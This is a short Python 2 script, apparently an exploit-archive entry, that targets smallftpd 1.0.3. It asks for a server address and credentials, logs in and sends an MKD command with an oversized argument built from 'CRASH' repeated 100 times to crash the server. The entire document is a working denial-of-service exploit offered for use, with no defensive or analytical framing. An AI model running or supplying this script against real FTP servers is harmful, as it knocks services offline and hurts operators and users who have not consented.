from ftplib import FTP

print '''
                ##############################################
                #    Created: ScrR1pTK1dd13                  #
                #    Name: Greg Priest                       #
                #    Mail: ScrR1pTK1dd13.slammer@gmail.com   # 
                ##############################################


# Exploit Title: smallftp_mkd_command_DoS_Exploit
# Date: 2016.10.26
# Exploit Author: Greg Priest
# Version: smallftpd 1.0.3
# Tested on: Windows XP, Windows 7 x64

'''

ftp_ip = raw_input("FTP server IP:")
user = raw_input("username:")
password = raw_input("password:")
killercode = 'CRASH' * 100
ftp = FTP(ftp_ip)
ftp.login(user, password)
print ftp.login
print "CRSAH CODE SENT!"
FTP.mkd(ftp, killercode)

